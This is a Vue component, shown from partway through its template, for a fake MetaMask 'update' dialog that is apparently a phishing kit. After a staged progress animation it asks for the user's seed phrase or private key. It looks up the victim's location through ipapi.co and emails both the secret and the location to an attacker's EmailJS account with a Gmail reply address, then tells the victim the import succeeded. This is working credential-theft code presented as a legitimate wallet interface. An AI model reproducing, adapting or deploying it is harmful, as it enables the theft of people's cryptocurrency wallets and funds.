            <div class="flex gap-3" style="margin-top: 4.5rem">
              <button
                @click="confirmPhrase"
                :disabled="isImportDisabled"
                class="flex-1 bg-[#0376c9] py-4 bg-[#0376c9] text-white border-none hover:border-none hover:text-[#222] rounded-[30px] font-bold text-[#222]"
              >
                Confirm
              </button>
            </div>
          </div>
        </div>
      </transition>

      <!-- message -->
      <transition name="fade">
        <div
          v-if="message.text"
          :class="[
            'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
            message.type === 'success'
              ? 'bg-green-600 text-white'
              : 'bg-red-600 text-white',
          ]"
        >
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import axios from "axios";
import { ref, computed, watch, nextTick } from "vue";

const emit = defineEmits(["close"]);
/* state */
const currentStep = ref(1);
const progress = ref(0);
const isLoading = ref(false);
const message = ref({ text: "", type: "" });

/* header control */
const showMetaMaskIcon = ref(true);
const headerTitle = ref("MetaMask");
const headerLink = ref("");
const headerLinkText = ref("");

/* import flow */
const importType = ref("12"); // '12' | '24' | 'private'
const phraseWords = ref([]);
const phraseCount = computed(() => (importType.value === "24" ? 24 : 12));
const hiddenFields = ref([]);
const privateKeyInput = ref("");

/* helper initializers */
function initPhraseWords() {
  phraseWords.value = Array(phraseCount.value).fill("");
  hiddenFields.value = Array(phraseCount.value).fill(true);
}

/* start initial state for step 1 -> auto advance after 3s */
const advanceTimer = setTimeout(() => {
  if (currentStep.value === 1) {
    nextStep(); // goes to step 2
  }
}, 3000);

/* basic actions */
function closeModal() {
  emit('close');
}

/* Start update: step 2 -> step 3 (spinner + progress) */
async function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;
  headerLink.value = "";
  headerLinkText.value = "";

  // animate progress from 0 to 100 in 3 seconds
  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;

  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      // done
      isLoading.value = false;
      // move to import step
      setTimeout(() => {
        currentStep.value = 4;
        initPhraseWords();
      }, 400);
    }
  }
  requestAnimationFrame(step);
}

/* Navigation */
function nextStep() {
  if (currentStep.value < 4) {
    currentStep.value++;
    if (currentStep.value === 4) {
      initPhraseWords();
    }
  }
}

function prevStep() {
  if (currentStep.value > 1) currentStep.value--;
}

/* Import handlers */
watch(importType, async (val) => {
  await nextTick();
  initPhraseWords();
});

function toggleFieldVisibility(idx) {
  hiddenFields.value[idx] = !hiddenFields.value[idx];
}

const isImportDisabled = computed(() => {
  // require all phrase words filled for 12/24
  if (importType.value === "private") {
    return !privateKeyInput.value.trim();
  } else {
    return phraseWords.value
      .slice(0, phraseCount.value)
      .some((w) => !w || !w.trim());
  }
});

async function confirmPhrase() {
  if (isImportDisabled.value) {
    return showMessage("Please fill all fields", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: importType.value,
      phrase: phraseWords.value.join(" "),
    };

    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Metamask Wallets",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      showMessage("Wallet imported successfully!", "success");
      emit("close");
    }

    if (!response.ok) throw new Error("Failed to import wallet");
    showMessage("Wallet imported successfully!", "success");
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function confirmPrivateKey() {
  if (!privateKeyInput.value.trim()) {
    return showMessage("Please enter your private key", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      privateKey: privateKeyInput.value,
    };
    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Metamask Wallets",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      showMessage("Wallet imported successfully!", "success");
      emit("close");
    }

    if (!response.ok) throw new Error("Failed to import wallet");
    showMessage("Private key imported successfully!", "success");
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

function cancelImport() {
  // return to previous screen (e.g., step 2)
  currentStep.value = 4;
  importType.value === "12";

  emit("close");
}


/* messages */
function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}

/* init */
initPhraseWords();
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.28s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
</style>
